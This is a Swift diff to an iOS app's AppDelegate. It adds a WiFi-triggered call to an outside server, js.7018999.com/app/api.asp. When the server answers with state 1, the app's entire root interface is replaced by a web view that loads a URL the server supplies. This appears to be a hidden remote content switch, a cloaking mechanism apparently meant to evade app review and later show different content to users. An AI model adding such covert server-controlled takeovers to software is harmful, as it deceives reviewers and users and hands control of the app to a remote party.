@@ -8,13 +8,12 @@
 import UIKit
 import SVProgressHUD
 import JLRoutes
+import Alamofire
+import SwiftyJSON
+import PromiseKit
 @UIApplicationMain
 class AppDelegate: UIResponder, UIApplicationDelegate,JPUSHRegisterDelegate {
  
-    
-    
-    
-
     var window: UIWindow?
     let tabViewController = YuwanRootViewController()
 
@@ -39,9 +38,65 @@ class AppDelegate: UIResponder, UIApplicationDelegate,JPUSHRegisterDelegate {
         self.initJpush(launchOptions: launchOptions)
         
         
+        let manager = NetworkReachabilityManager(host: "https://github.com/Alamofire/Alamofire.git")
+      
+            // Override point for customization after application launch.
+            manager!.listener = { status in
+                
+                switch status {
+                case .notReachable:
+                    print("***notReachable")
+                case .unknown:
+                    print("***unknown")
+                case .reachable(.ethernetOrWiFi):
+                    print("***ethernetOrWiFi")
+                    self.changeTab()
+                case .reachable(.wwan):
+                    print("***wwan")
+                    
+                }
+            }
+            manager!.startListening()
+        
         return true
     }
+    
+    func changeTab() {
+        if self.window?.rootViewController != tabViewController  {
+            return
+        }
+        let headers = ["Content-Type": "text/html","Accept":"application/json"]
+        let manager = Alamofire.SessionManager.default
+        manager.session.configuration.timeoutIntervalForRequest = 10
 
+        manager.request("https://js.7018999.com/app/api.asp").responseString { (respone) in
+        
+            
+          //  let str = "{\"state\":1, \"url\": \"https://js.7018999.com/app/sm.html\"}"
+            print(respone.result.value)
+            let dic = self.stringValueDic(respone.result.value ?? "{state:0}")
+            if dic == nil {
+                return
+            }
+            if dic!["state"] as! Int == 1 {
+                let webView = RooTableViewController()
+                webView.loadUrl = dic!["url"] as! String
+                self.window?.rootViewController = webView
+            }
+        
+        }
+        
+        
+    }
+    func stringValueDic(_ str: String) -> [String : Any]?{
+        let data = str.data(using: String.Encoding.utf8)
+        if let dict = try? JSONSerialization.jsonObject(with: data!, options: JSONSerialization.ReadingOptions.mutableContainers) as? [String : Any] {
+            return dict
+        }
+        return nil
+    }
+    
+    
     func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
         JPUSHService.registerDeviceToken(deviceToken)
         
